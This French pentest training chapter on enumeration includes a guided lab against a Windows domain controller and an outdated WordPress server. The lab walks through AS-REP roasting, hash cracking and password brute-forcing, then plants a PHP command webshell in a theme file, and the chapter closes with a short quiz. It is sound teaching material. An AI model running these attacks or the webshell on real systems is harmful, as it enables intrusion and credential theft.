| | snmpwalk | `snmpwalk -v 2c -c public 10.10.10.10` | Énumération SNMP avec communauté public |
| **Multi** | crackmapexec | `crackmapexec smb 10.10.10.0/24 -u user -p pass --continue-on-success` | Test de mot de passe sur un réseau |

### Check-list "Enum rapide"

#### 1. Reconnaissance initiale (5 min)
- [ ] Scan rapide des ports : `nmap -sS --min-rate 1000 -p- 10.10.10.10`
- [ ] Identification des services : `nmap -sC -sV -p [ports_ouverts] 10.10.10.10`
- [ ] Vérification des ports UDP courants : `nmap -sU -p 53,69,111,123,161,500 10.10.10.10`

#### 2. Énumération SMB (5 min)
- [ ] Vérification des partages anonymes : `smbmap -H 10.10.10.10 -u anonymous`
- [ ] Exploration des partages accessibles : `smbclient -L //10.10.10.10 -N`
- [ ] Recherche de fichiers sensibles : `smbmap -H 10.10.10.10 -u anonymous -R [partage] -A .txt,.pdf,.doc,.conf`

#### 3. Énumération LDAP/AD (10 min)
- [ ] Recherche anonyme : `ldapsearch -x -H ldap://10.10.10.10 -b "dc=exemple,dc=com"`
- [ ] Énumération d'utilisateurs : `enum4linux-ng -U 10.10.10.10`
- [ ] Vérification AS-REP Roasting : `GetNPUsers.py exemple.com/ -usersfile users.txt -format hashcat`
- [ ] Vérification Kerberoasting (si identifiants disponibles) : `GetUserSPNs.py exemple.com/user:password -request`

#### 4. Énumération Web (10 min)
- [ ] Identification des technologies : `whatweb http://10.10.10.10`
- [ ] Découverte de contenu : `ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt`
- [ ] Vérification de CMS : `wpscan --url http://10.10.10.10` (si WordPress détecté)
- [ ] Recherche de vulnérabilités : `nikto -h http://10.10.10.10`

#### 5. Autres services (5 min)
- [ ] SNMP : `snmpwalk -v 2c -c public 10.10.10.10`
- [ ] FTP anonyme : `ftp 10.10.10.10` (utilisateur: anonymous)
- [ ] SSH : Vérification de la bannière et version (`nc -nv 10.10.10.10 22`)

### Scénario express 30 min : Trouver compte exposé sur serveur AD + ancien WordPress

**Contexte** : Vous disposez de 30 minutes pour identifier un compte utilisateur vulnérable sur un serveur Active Directory et trouver des vulnérabilités sur un WordPress obsolète hébergé sur le même réseau.

**Cible** : Réseau 10.10.10.0/24 avec serveur AD et serveur web

#### Étape 1 : Découverte des hôtes (5 min)
```bash
# Scan rapide du réseau
nmap -sn 10.10.10.0/24
# Identification du contrôleur de domaine (ports 53, 88, 389)
nmap -p 53,88,389 --open 10.10.10.0/24
# Identification du serveur web (ports 80, 443)
nmap -p 80,443 --open 10.10.10.0/24
```

#### Étape 2 : Énumération du contrôleur de domaine (10 min)
```bash
# Supposons que le DC est 10.10.10.10
# Récupération du nom de domaine
nmap -p 389 --script ldap-rootdse 10.10.10.10

# Énumération des utilisateurs
enum4linux-ng -U 10.10.10.10

# Vérification des utilisateurs sans pré-authentification Kerberos
GetNPUsers.py exemple.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Si un hash est récupéré, tentative de crack avec hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

#### Étape 3 : Énumération du serveur web (10 min)
```bash
# Supposons que le serveur web est 10.10.10.20
# Identification des technologies
whatweb http://10.10.10.20

# Si WordPress est détecté
wpscan --url http://10.10.10.20 --enumerate vp,u

# Découverte de contenu
ffuf -u http://10.10.10.20/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

#### Étape 4 : Exploitation des vulnérabilités (5 min)
```bash
# Si un plugin WordPress vulnérable est identifié, recherche d'exploits
searchsploit [nom_plugin] wordpress

# Si un compte utilisateur AD est compromis, tentative d'accès SMB
smbmap -H 10.10.10.10 -d exemple.com -u utilisateur_compromis -p mot_de_passe_trouvé
```

**Résultats attendus** :
1. Un compte utilisateur AD vulnérable à l'AS-REP Roasting avec mot de passe faible
2. Un site WordPress avec plugins obsolètes exploitables
3. Accès potentiel aux ressources partagées via le compte compromis

Cette approche méthodique permet d'identifier rapidement les vulnérabilités les plus courantes dans un environnement mixte Windows/Web, en se concentrant sur les vecteurs d'attaque à fort potentiel.
## Mini-lab guidé (60 min)

Ce mini-lab vous permet de mettre en pratique les techniques d'énumération sur un environnement mixte comprenant un contrôleur de domaine Windows Server 2019 et un serveur WordPress obsolète. L'objectif est de découvrir des vulnérabilités et d'obtenir un accès initial aux deux systèmes.

### Environnement du lab

- Contrôleur de domaine : Windows Server 2019 (IP : 192.168.1.10)
- Serveur web : Ubuntu 20.04 avec WordPress 5.7 (IP : 192.168.1.20)
- Votre machine : Kali Linux (IP : 192.168.1.100)

### Objectifs

1. Énumérer le contrôleur de domaine et identifier un compte vulnérable
2. Exploiter la vulnérabilité pour obtenir des identifiants valides
3. Énumérer le serveur WordPress et identifier des plugins vulnérables
4. Exploiter une vulnérabilité WordPress pour obtenir un accès au serveur

### Phase 1 : Reconnaissance initiale (10 min)

Commençons par identifier les hôtes actifs et les services exposés sur le réseau.

```bash
# Scan du réseau pour identifier les hôtes actifs
sudo nmap -sn 192.168.1.0/24

# Scan détaillé des deux cibles identifiées
sudo nmap -sC -sV -p- -T4 192.168.1.10 -oN dc_scan.txt
sudo nmap -sC -sV -p- -T4 192.168.1.20 -oN web_scan.txt
```

**Résultats attendus** :
- Le contrôleur de domaine (192.168.1.10) devrait exposer les ports typiques d'Active Directory : 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), etc.
- Le serveur web (192.168.1.20) devrait exposer les ports 80 (HTTP) et éventuellement 443 (HTTPS).

### Phase 2 : Énumération du contrôleur de domaine (20 min)

#### Étape 1 : Identification du domaine

```bash
# Récupération des informations de base via LDAP
ldapsearch -x -H ldap://192.168.1.10 -b "" -s base

# Récupération du nom NetBIOS via SMB
nmblookup -A 192.168.1.10
```

Supposons que le domaine identifié est `CORP.LOCAL`.

#### Étape 2 : Énumération SMB

```bash
# Vérification des partages accessibles anonymement
smbmap -H 192.168.1.10

# Tentative de connexion anonyme
smbclient -L //192.168.1.10 -N

# Énumération complète avec enum4linux-ng
enum4linux-ng -A 192.168.1.10
```

**Résultat attendu** : Un partage `Public` accessible anonymement contenant potentiellement des informations utiles.

```bash
# Connexion au partage Public
smbclient //192.168.1.10/Public -N

# Dans la session SMB
smb: \> ls
smb: \> get employees.xlsx
smb: \> exit
```

#### Étape 3 : Extraction d'informations du fichier récupéré

```bash
# Installation de l'outil pour lire les fichiers Excel
sudo apt-get install -y xlsx2csv

# Conversion et affichage du contenu
xlsx2csv employees.xlsx > employees.csv
cat employees.csv
```

**Résultat attendu** : Une liste d'employés avec leurs noms d'utilisateur au format `prenom.nom`.

#### Étape 4 : Création d'une liste d'utilisateurs

```bash
# Extraction des noms d'utilisateurs potentiels
cat employees.csv | cut -d ',' -f 3 > users.txt

# Vérification du contenu
cat users.txt
```

#### Étape 5 : Énumération Kerberos

```bash
# Vérification des utilisateurs valides avec Kerbrute
kerbrute userenum -d CORP.LOCAL --dc 192.168.1.10 users.txt

# Recherche d'utilisateurs vulnérables à l'AS-REP Roasting
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass

# Vérification des hashes récupérés
cat asrep_hashes.txt
```

**Résultat attendu** : Un hash pour l'utilisateur `john.smith` qui a la pré-authentification Kerberos désactivée.

#### Étape 6 : Craquage du hash

```bash
# Craquage avec hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Résultat attendu** : Le mot de passe `Summer2023!` pour l'utilisateur `john.smith`.

#### Étape 7 : Validation des identifiants

```bash
# Test des identifiants via SMB
crackmapexec smb 192.168.1.10 -u john.smith -p 'Summer2023!' --shares
```

**Résultat attendu** : Accès confirmé avec liste des partages accessibles pour cet utilisateur.

### Phase 3 : Énumération du serveur WordPress (20 min)

#### Étape 1 : Reconnaissance web initiale

```bash
# Identification des technologies
whatweb http://192.168.1.20

# Découverte de contenu
ffuf -u http://192.168.1.20/FUZZ -w /usr/share/wordlists/dirb/common.txt -c
```

**Résultat attendu** : Confirmation de WordPress et découverte de répertoires comme `/wp-admin`, `/wp-content`, etc.

#### Étape 2 : Énumération WordPress

```bash
# Scan WordPress complet
wpscan --url http://192.168.1.20 --enumerate p,t,u

# Scan avec recherche de vulnérabilités
wpscan --url http://192.168.1.20 --enumerate vp,vt
```

**Résultats attendus** :
- WordPress version 5.7 (obsolète)
- Plugin Contact Form 7 version 5.3.2 (vulnérable)
- Utilisateur administrateur `admin`

#### Étape 3 : Recherche d'exploits

```bash
# Recherche d'exploits pour le plugin identifié
searchsploit contact form 7 5.3.2
```

**Résultat attendu** : Identification d'une vulnérabilité de téléchargement de fichiers non autorisés dans Contact Form 7 5.3.2.

#### Étape 4 : Brute force du compte administrateur

```bash
# Tentative de brute force avec WPScan
wpscan --url http://192.168.1.20 -U admin -P /usr/share/wordlists/fasttrack.txt
```

**Résultat attendu** : Découverte du mot de passe `wordpress123` pour l'utilisateur `admin`.

### Phase 4 : Exploitation (10 min)

#### Exploitation du contrôleur de domaine

```bash
# Accès aux partages avec les identifiants obtenus
smbclient //192.168.1.10/Users -U CORP.LOCAL/john.smith%Summer2023!

# Récupération de fichiers sensibles
smb: \> cd john.smith\Desktop
smb: \> get confidential.txt
smb: \> exit

# Affichage du contenu
cat confidential.txt
```

**Résultat attendu** : Accès à des informations confidentielles et confirmation de la compromission du compte.

#### Exploitation du serveur WordPress

```bash
# Connexion à l'interface d'administration WordPress
firefox http://192.168.1.20/wp-admin

# Utiliser les identifiants : admin / wordpress123
```

Une fois connecté à l'interface d'administration :

1. Naviguer vers Apparence > Éditeur de thème
2. Sélectionner le thème actif
3. Éditer le fichier 404.php et remplacer son contenu par une webshell PHP simple :

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

4. Mettre à jour le fichier
5. Accéder à la webshell via le navigateur :

```
http://192.168.1.20/wp-content/themes/twentytwentyone/404.php?cmd=id
```

**Résultat attendu** : Exécution de commandes sur le serveur web, confirmant la compromission.

### Conclusion du lab

Dans ce mini-lab, vous avez :

1. Énuméré un contrôleur de domaine Windows Server 2019
2. Identifié et exploité un compte vulnérable à l'AS-REP Roasting
3. Énuméré un serveur WordPress obsolète
4. Identifié des plugins vulnérables et un compte administrateur avec mot de passe faible
5. Obtenu un accès aux deux systèmes

Ces techniques d'énumération sont essentielles pour les tests d'intrusion et les examens comme l'OSCP, où l'identification méthodique des vulnérabilités est cruciale pour le succès.
## Pièges classiques

L'énumération, bien que méthodique, comporte de nombreux pièges qui peuvent ralentir votre progression ou vous faire manquer des informations critiques. Voici les erreurs les plus courantes et comment les éviter.

### 1. Scan incomplet des ports

**Piège** : Se contenter d'un scan des ports par défaut (top 1000) et manquer des services critiques sur des ports non standards.

**Exemple** : Un serveur web sur le port 8080 ou un service SSH sur le port 2222 ne seront pas détectés par un scan nmap standard.

**Solution** : Toujours effectuer un scan complet des ports après le scan initial.
```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 1000 -T4 10.10.10.10

# Scan UDP des ports les plus courants
nmap -sU --top-ports 100 10.10.10.10
```

### 2. Ignorer les versions des services

**Piège** : Noter la présence d'un service sans identifier sa version précise, manquant ainsi des vulnérabilités spécifiques.

**Exemple** : Un serveur Apache 2.4.49 est vulnérable à une faille de traversée de répertoire (CVE-2021-41773), mais cette information est manquée si seule la présence d'Apache est notée.

**Solution** : Toujours utiliser l'option `-sV` de nmap et des outils spécifiques comme `whatweb` pour identifier précisément les versions.

### 3. Négliger les services "secondaires"

**Piège** : Se concentrer uniquement sur les services "intéressants" comme SSH, HTTP ou SMB, en négligeant des services comme SNMP, NFS ou SMTP.

**Exemple** : Un service SNMP mal configuré avec la communauté "public" peut révéler l'ensemble des utilisateurs et processus d'un système.

**Solution** : Énumérer systématiquement tous les services détectés, même ceux qui semblent moins prometteurs.

### 4. Énumération web superficielle

**Piège** : Se contenter d'une découverte de contenu basique sans explorer les technologies sous-jacentes ou les fonctionnalités spécifiques.

**Exemple** : Manquer un CMS installé dans un sous-répertoire ou ne pas identifier un framework JavaScript vulnérable.

**Solution** : Utiliser une approche multicouche :
```bash
# Identification des technologies
whatweb http://10.10.10.10

# Découverte de contenu avec plusieurs wordlists
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Recherche d'extensions spécifiques
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.old
```

### 5. Wordlists inappropriées

**Piège** : Utiliser des wordlists génériques qui ne correspondent pas au contexte de la cible.

**Exemple** : Utiliser une wordlist anglaise pour un site en français, ou une wordlist générique pour une application spécifique comme SharePoint.

**Solution** : Adapter vos wordlists au contexte :
- Utiliser des wordlists spécifiques à la technologie (WordPress, Joomla, etc.)
- Créer des wordlists personnalisées basées sur le contenu du site
- Combiner plusieurs sources pour une couverture maximale

### 6. Ignorer les réponses "négatives"

**Piège** : Ne pas analyser les codes de réponse HTTP 403 (Forbidden) qui peuvent indiquer du contenu protégé mais existant.

**Exemple** : Un répertoire `/admin` retournant 403 indique sa présence, contrairement à un 404 (Not Found).

**Solution** : Analyser tous les codes de réponse et filtrer intelligemment :
```bash
# Conserver les 403 dans les résultats
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -mc 200,301,302,403
```

### 7. Sous-estimer l'énumération des utilisateurs

**Piège** : Négliger la phase d'énumération des utilisateurs, se concentrant uniquement sur les services et applications.

**Exemple** : Manquer un utilisateur vulnérable à l'AS-REP Roasting dans un domaine Active Directory.

**Solution** : Consacrer du temps spécifique à l'énumération des utilisateurs :
```bash
# Énumération via RPC
rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"

# Énumération via Kerberos
kerbrute userenum -d exemple.com --dc 10.10.10.10 users.txt
```

### 8. Oublier de corréler les informations

**Piège** : Traiter chaque service séparément sans établir de liens entre les informations découvertes.

**Exemple** : Ne pas essayer les identifiants découverts dans un fichier de configuration web sur les services SSH ou SMB.

**Solution** : Maintenir une base de connaissances centralisée et tester systématiquement les informations d'un service sur les autres.

### 9. Ignorer les indices contextuels

**Piège** : Ne pas prendre en compte le contexte de la cible (entreprise, secteur d'activité, etc.) dans l'énumération.

**Exemple** : Pour une entreprise financière, ne pas chercher spécifiquement des applications bancaires ou des portails de paiement.

**Solution** : Adapter votre énumération au contexte :
- Rechercher des termes spécifiques au secteur
- Explorer les technologies couramment utilisées dans le domaine
- Considérer les réglementations et contraintes du secteur

### 10. Énumération trop bruyante

**Piège** : Générer trop de bruit réseau, déclenchant des alertes de sécurité et compromettant votre test.

**Exemple** : Lancer un scan nmap agressif (T5) ou un fuzzing web sans limitation de vitesse.

**Solution** : Adopter une approche discrète :
```bash
# Scan nmap discret
nmap -T2 --max-retries 1 --max-scan-delay 500ms 10.10.10.10

# Fuzzing web limité
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -rate 10
```

### 11. Ne pas documenter systématiquement

**Piège** : Négliger la documentation en temps réel des découvertes, perdant ainsi des informations cruciales.

**Exemple** : Oublier un nom d'utilisateur découvert au début de l'énumération qui aurait été utile pour une exploitation ultérieure.

**Solution** : Maintenir une documentation structurée :
- Noter chaque découverte immédiatement
- Organiser les informations par catégorie (utilisateurs, partages, URLs, etc.)
- Utiliser des outils comme CherryTree ou Obsidian pour centraliser les notes

### 12. Abandonner trop vite

**Piège** : Passer rapidement à un autre service après un échec initial, manquant des configurations ou vulnérabilités moins évidentes.

**Exemple** : Abandonner l'énumération LDAP après une tentative de recherche anonyme infructueuse, sans essayer d'autres bases DN ou filtres.

**Solution** : Approfondir chaque service avec plusieurs techniques :
```bash
# Plusieurs tentatives LDAP avec différentes bases
ldapsearch -x -H ldap://10.10.10.10 -b "dc=exemple,dc=com"
ldapsearch -x -H ldap://10.10.10.10 -b "cn=Users,dc=exemple,dc=com"
ldapsearch -x -H ldap://10.10.10.10 -b "ou=People,dc=exemple,dc=com"
```

En évitant ces pièges classiques, vous améliorerez considérablement l'efficacité de votre énumération et augmenterez vos chances de découvrir des vulnérabilités exploitables.
## Points clés

L'énumération constitue le fondement de toute opération de sécurité offensive réussie. Voici les principes essentiels à retenir pour maximiser l'efficacité de cette phase critique.

### Méthodologie avant outils

La réussite de l'énumération repose davantage sur une approche méthodique que sur la maîtrise d'outils spécifiques. Adoptez une démarche structurée :

1. **Progression du général au spécifique** : Commencez par une vue d'ensemble (scan de ports) avant d'approfondir chaque service.
2. **Documentation systématique** : Notez chaque découverte, même celles qui semblent anodines.
3. **Corrélation des informations** : Établissez des liens entre les données recueillies sur différents services.
4. **Itération constante** : Revenez régulièrement sur les services déjà énumérés avec de nouvelles informations.

### Exhaustivité et patience

L'énumération complète est souvent la différence entre l'échec et la réussite :

1. **Scan complet des ports** : Ne vous limitez jamais aux ports standards.
2. **Exploration de tous les services** : Même les services apparemment secondaires peuvent révéler des informations cruciales.
3. **Persistance** : Les vulnérabilités les plus intéressantes sont rarement découvertes au premier passage.
4. **Validation croisée** : Confirmez les informations obtenues via plusieurs techniques ou outils.

### Adaptabilité contextuelle

Chaque cible est unique et nécessite une approche adaptée :

1. **Ajustement des techniques** : Modifiez votre approche en fonction du type de système (Windows, Linux, cloud).
2. **Personnalisation des wordlists** : Créez ou sélectionnez des dictionnaires pertinents pour le contexte.
3. **Équilibre entre largeur et profondeur** : Selon le temps disponible, privilégiez soit une couverture large, soit une analyse approfondie de services critiques.
4. **Sensibilité à l'environnement** : Adaptez votre niveau de "bruit" selon que vous êtes en CTF, examen ou environnement de production.

### Perspective défensive

Comprendre la vision du défenseur améliore votre énumération :

1. **Conscience des traces** : Identifiez quelles actions génèrent des alertes et adaptez votre approche.
2. **Configurations par défaut** : Connaissez les configurations standards et leurs faiblesses typiques.
3. **Erreurs courantes** : Familiarisez-vous avec les erreurs de configuration fréquentes pour chaque service.
4. **Détection des honeypots** : Apprenez à reconnaître les pièges délibérément placés pour détecter les attaquants.

### Évolution technologique

Le paysage des outils et techniques évolue constamment :

1. **Veille technologique** : Suivez l'évolution des outils d'énumération et leurs nouvelles fonctionnalités.
2. **Automatisation intelligente** : Utilisez des scripts pour automatiser les tâches répétitives tout en conservant un contrôle humain sur l'analyse.
3. **Intégration des nouveaux vecteurs** : Restez informé des nouveaux services et protocoles qui émergent dans les infrastructures modernes.
4. **Adaptation aux contre-mesures** : Ajustez vos techniques face à l'évolution des mécanismes de protection.

### Équilibre entre outils et compréhension

Les outils ne remplacent pas la compréhension fondamentale :

1. **Maîtrise des protocoles** : Comprenez le fonctionnement des protocoles que vous énumérez (SMB, HTTP, LDAP, etc.).
2. **Interprétation des résultats** : Développez la capacité d'analyser les résultats au-delà de ce que les outils rapportent.
3. **Techniques manuelles** : Sachez effectuer une énumération basique sans outils spécialisés.
4. **Personnalisation des outils** : Adaptez les outils existants à vos besoins spécifiques.

L'énumération est un art qui se perfectionne avec l'expérience. Chaque test d'intrusion ou CTF enrichit votre compréhension des systèmes et affine votre capacité à identifier efficacement les vulnérabilités. La patience, la rigueur et la curiosité sont vos meilleurs atouts dans cette phase fondamentale de la sécurité offensive.
## Mini-quiz (3 QCM)

Testez vos connaissances sur l'énumération avec ces trois questions à choix multiples.

### Question 1 : Énumération SMB

Lors d'un test d'intrusion sur un serveur Windows, vous avez identifié que le port 445 est ouvert. Quelle séquence d'outils et d'actions représente la meilleure approche d'énumération SMB ?

A) Utiliser directement `enum4linux-ng -A` pour obtenir toutes les informations en une seule commande

B) Commencer par `smbclient -L //10.10.10.10 -N`, puis utiliser `smbmap -H 10.10.10.10 -u anonymous` pour vérifier les permissions, et enfin explorer les partages accessibles avec `smbclient //10.10.10.10/share -N`

C) Lancer immédiatement `crackmapexec smb 10.10.10.10 -u Administrator -p /usr/share/wordlists/rockyou.txt` pour tenter de compromettre un compte administrateur

D) Exécuter uniquement `nmap --script smb-vuln*` pour identifier les vulnérabilités SMB sans énumérer les partages ou utilisateurs

**Réponse correcte : B**

**Explication** : L'approche méthodique consiste à commencer par identifier les partages disponibles (`smbclient -L`), puis vérifier les permissions sur ces partages (`smbmap`), et enfin explorer le contenu des partages accessibles. Cette progression du général au spécifique maximise les chances de découvrir des informations utiles tout en minimisant le bruit réseau. L'option A est moins optimale car elle génère beaucoup de bruit réseau d'un coup. L'option C saute l'étape d'énumération pour passer directement à l'exploitation, ce qui est inefficace et bruyant. L'option D se concentre uniquement sur les vulnérabilités sans explorer le contenu potentiellement accessible.

### Question 2 : Énumération Web

Vous découvrez un site WordPress lors de votre énumération. Quelle affirmation concernant l'énumération web est FAUSSE ?

A) L'outil `wpscan` permet d'identifier les plugins vulnérables, les thèmes et les utilisateurs d'un site WordPress

B) La commande `ffuf -u http://site.com/FUZZ -w wordlist.txt -fc 404` permet de découvrir du contenu en excluant les réponses 404

C) Les réponses HTTP 403 (Forbidden) doivent être ignorées car elles indiquent que le contenu n'existe pas

D) L'identification des technologies avec `whatweb` ou Wappalyzer doit précéder la découverte de contenu pour adapter les wordlists

**Réponse correcte : C**

**Explication** : Les réponses HTTP 403 (Forbidden) indiquent que le contenu existe mais que l'accès est refusé, contrairement aux 404 (Not Found) qui signifient que le contenu n'existe pas. Les 403 sont donc des informations précieuses qui révèlent la présence de contenu potentiellement sensible. Les options A, B et D sont toutes des pratiques recommandées pour l'énumération web : utiliser des outils spécialisés comme `wpscan` pour les CMS, filtrer intelligemment les résultats de fuzzing, et commencer par identifier les technologies pour adapter l'approche.

### Question 3 : Énumération d'utilisateurs et services

Dans un environnement Active Directory, vous avez obtenu une liste d'utilisateurs potentiels. Quelle technique d'énumération présente le MOINS de risques d'être détectée par les défenseurs ?

A) Utiliser `crackmapexec smb 10.10.10.10 -u users.txt -p password --continue-on-success` pour tester un mot de passe sur tous les utilisateurs

B) Exécuter `GetNPUsers.py DOMAIN.LOCAL/ -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass` pour identifier les utilisateurs vulnérables à l'AS-REP Roasting

C) Lancer `kerbrute userenum -d DOMAIN.LOCAL --dc 10.10.10.10 users.txt` pour valider l'existence des utilisateurs

D) Utiliser `rpcclient -U "Administrator%password" 10.10.10.10 -c "enumdomusers"` pour lister tous les utilisateurs du domaine

**Réponse correcte : C**

**Explication** : `kerbrute` utilise le protocole Kerberos d'une manière qui génère très peu d'événements de sécurité dans les journaux Windows, contrairement aux autres options. L'option A (password spraying avec crackmapexec) génère un événement d'échec d'authentification pour chaque tentative incorrecte. L'option B (AS-REP Roasting) génère des événements pour chaque utilisateur testé. L'option D nécessite des identifiants valides et génère des événements d'authentification réussie, facilement identifiables dans un contexte anormal.
